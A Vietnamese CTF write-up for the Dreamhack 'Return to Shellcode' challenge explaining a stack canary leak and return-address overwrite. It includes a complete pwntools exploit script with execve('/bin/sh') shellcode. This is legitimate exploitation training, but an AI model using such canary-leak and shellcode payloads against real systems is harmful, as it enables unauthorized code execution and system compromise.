# Challenge: Return to Shellcode

## Vấn đề
- [File Challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/ret2shellcode/r2s)
- Khi thực thi, chương trình tạo char buf[88] sau đó chạy printf("Address of the buf: %p\n", buf).
- Sau đó, chương trình chạy printf("Distance between buf and $rbp: %ld\n", 96).
- Tiếp theo, chương trình cho user nhập input 2 lần và exit.
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Full RELRO
+ Stack:      Canary found
+ NX:         NX unknown - GNU_STACK missing
+ PIE:        PIE enabled
+ Stack:      Executable
+ RWX:        Has RWX segments
+ Stripped:   No
```

## Giải pháp
- Trước tiên, ta thấy rằng chương trình đã cho leak địa chỉ buffer cùng với offset tới canary.
> Do đó, ta sẽ lấy địa chỉ được leak này và overwrite tới canary để leak luôn canary.
- Ta đã có địa chỉ buf và canary + NX tắt do đó có thể đẩy shellcode vào để lấy shell.
> Thay đổi địa chỉ ret thành địa chỉ shellcode.

## Quá trình
- Sau khi leak được buffer, ta đẩy 0x89 bytes rác (0x58 bytes để tới canary và overwrite 1 bytes 00 của canary để có thể leak toàn bộ).
> Canary lúc này sẽ có 7 bytes đúng + 1 bytes rác, do đó cần chuyển bytes rác thành 00 bằng **& ~0xff**
- Viết shellcode: execve("/bin/sh", 0, 0).
> Payload = shellcode.ljust(0x58, b'A') + canary_leak + 8 bytes rác (saved rbp) + địa chỉ buf đã leak
```
* Lưu ý: Vì canary sẽ kiểm tra nếu canary lúc check với canary gốc khác thì chương trình sẽ bị dừng ngay lập tức, do đó phải xem xét kỹ nên overwrite 1 byte như bài này để leak hay ko.
=> Nếu ko thể thì buộc phải tìm cách khác.
```

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('r2s', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+190

        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 9221)
else:
    p = process([exe.path])
GDB()

### STAGE 1: Leak buffer address + Canary
p.recvuntil(b'buf: ')
buffer_leak = int(p.recvline()[:-1], 16)
info("Buffer address: " + hex(buffer_leak))

sa(b'Input: ', b'A'*0x59)
p.recvuntil(b"is '" + b'A'*0x58)
canary_leak = u64(p.recv(8)) & ~0xff
info("Canary leak: " + hex(canary_leak))

### STAGE 2: Viet shellcode & Overwrite
shellcode = asm(
    '''
    xor rax, rax
    push rax
    mov rax, 7526411283028599343
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch='amd64'
    )

payload = flat(
    shellcode.ljust(0x58, b'A'),
    p64(canary_leak),
    p64(0), #Saved rbp
    p64(buffer_leak), #Saved rip
    )
sa(b'Input: ', payload)

p.interactive()
```
